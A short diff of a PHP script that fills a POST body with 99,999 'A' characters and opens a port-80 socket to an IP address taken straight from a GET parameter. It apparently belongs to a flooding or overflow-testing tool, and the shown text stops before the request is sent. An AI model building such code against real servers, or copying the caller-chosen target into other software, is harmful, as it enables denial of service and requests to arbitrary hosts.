@@ -1,9 +1,10 @@
 <?php
 $data = str_repeat("A", 99999);
+$ip = $_GET['ip'];
 $host = $_GET['host'];
 $path = "/";
 $post_data = 'data=' . $data;
-$socket = fsockopen($host, 80, $errno, $errstr, 15);
+$socket = fsockopen($ip, 80, $errno, $errstr, 15);
 if (!$socket) {
 	echo ' error: ' . $errno . ' ' . $errstr;
 	die;
